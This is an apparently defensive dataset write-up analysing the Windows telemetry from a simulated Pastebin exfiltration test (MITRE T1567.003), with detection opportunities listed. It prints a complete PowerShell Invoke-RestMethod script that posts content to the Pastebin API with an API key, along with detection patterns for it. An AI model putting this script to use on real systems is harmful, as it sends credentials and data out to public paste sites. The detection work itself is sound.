# T1567.003-1: Exfiltration to Text Storage Sites — Windows

## Technique Context

T1567.003 (Exfiltration to Text Storage Sites) covers adversaries using legitimate public
text-sharing services (Pastebin, GitHub Gist, Hastebin, etc.) to exfiltrate data via HTTP/S
POST requests. These services blend into normal web traffic, often use shared infrastructure
that is difficult to block without collateral damage, and can hold exfiltrated data (credentials,
API keys, config files) accessible from anywhere. Unlike cloud storage (T1567.002), text storage
sites are trivially accessible via a simple REST call, require no client tool, and may not
trigger DLP controls watching for file uploads.

## What This Dataset Contains

The dataset spans approximately 5 seconds (14:29:19–14:29:24 UTC) from ACME-WS02.

**PowerShell 4104 (Script Block Logging)** records the full exfiltration payload:

```
$apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
$content = "secrets, api keys, passwords..."
$url = "https://pastebin.com/api/api_post.php"
$postData = @{
  api_dev_key   = $apiKey
  api_option    = "paste"
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host "Your paste URL: $response"
```

This reveals the API key, the exfiltrated content placeholder, the exact POST endpoint, and
the API parameter structure. This appears in both the outer and inner 4104 forms.

**PowerShell 4103 (Module Logging)** records:
- `Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body System.Collections.Hashtable`
- `Write-Host -Object "Your paste URL: https://pastebin.com/MY1csQQs"` — the response
  from Pastebin with the resulting paste URL.

The `Write-Host` parameter binding is particularly significant: it shows that the Pastebin
API call **succeeded** and returned a valid paste URL (`https://pastebin.com/MY1csQQs`). This
is one of the few tests in this batch where Defender did not block the action and the technique
completed successfully.

**Sysmon Event 1 (Process Create)** captures `whoami.exe` (ART pre-flight) and `powershell.exe`
with the full `$apiKey`/`$url`/`Invoke-RestMethod` command line visible (tagged T1059.001).

**Sysmon Events 7, 10, 11, 17** show standard PowerShell startup patterns: DLL loads, process
access on `whoami.exe`, profile file creation, and `\PSHost.*` pipe creation.

**Security 4688/4689** record `whoami.exe` and `powershell.exe` lifecycle under SYSTEM.

## What This Dataset Does Not Contain (and Why)

**No Sysmon Event 3 (Network Connection) or Event 22 (DNS) for pastebin.com.** The outbound
`Invoke-RestMethod` call to `pastebin.com` is not captured in Sysmon network telemetry. This
is consistent with what is observed in T1566.001-1: .NET HTTP client connections do not always
trigger Sysmon Event 3 depending on the protocol stack used. The successful POST is confirmed
by the PowerShell module log (`Write-Host` recording the returned paste URL), not by network-
layer telemetry.

**No DNS query for pastebin.com.** The absence of a Sysmon 22 event for `pastebin.com` is
similarly explained by the .NET HTTP client path, which may resolve DNS through a different
code path than raw socket operations.

**No DLP or content inspection telemetry.** The test uses a placeholder string
(`"secrets, api keys, passwords..."`) rather than real credential data. No DLP control fired.

**No Defender block.** The `Invoke-RestMethod` HTTPS POST to a legitimate domain succeeded
without intervention, consistent with Defender's behavior of not blocking outbound HTTPS to
major cloud services.

## Assessment

This is a notable dataset because the exfiltration succeeded: the PowerShell module log
confirms `Write-Host "Your paste URL: https://pastebin.com/MY1csQQs"`. The 4104 script block
contains the API key and the complete POST payload. Together these provide ground truth for
what a successful Pastebin exfiltration looks like in Windows telemetry.

The contrast with T1567.002-1 (rclone/Mega, no confirmed success) is instructive: a simple
`Invoke-RestMethod` POST requires no additional tooling, succeeds despite active Defender,
and leaves its clearest traces in PowerShell logs rather than network telemetry.

## Detection Opportunities Present in This Data

- **PowerShell 4103**: `Invoke-RestMethod` with URI matching `pastebin.com/api/api_post.php`
  or `Write-Host` returning a `pastebin.com/` URL is a direct indicator of successful
  exfiltration. Similar patterns apply to `gist.github.com`, `hastebin.com`, and similar sites.

- **PowerShell 4104**: Script block containing `api_paste_code`, `api_dev_key`, and
  `api_option = "paste"` matches the Pastebin API structure specifically.

- **PowerShell 4103 / 4104 combined**: Any script that builds a hashtable with `api_paste_code`
  as a key and then calls `Invoke-RestMethod -Method Post` is functionally a Pastebin exfil
  regardless of domain.

- **Security 4688**: Command line for `powershell.exe` contains `Invoke-RestMethod`,
  `pastebin.com`, and credential-like strings when command-line auditing is enabled.

- **Network (not in this dataset)**: HTTPS POST to `pastebin.com` from a non-browser process
  would be the strongest network-layer signal; proxy logs or NGFW SSL inspection would capture
  this where Sysmon does not.
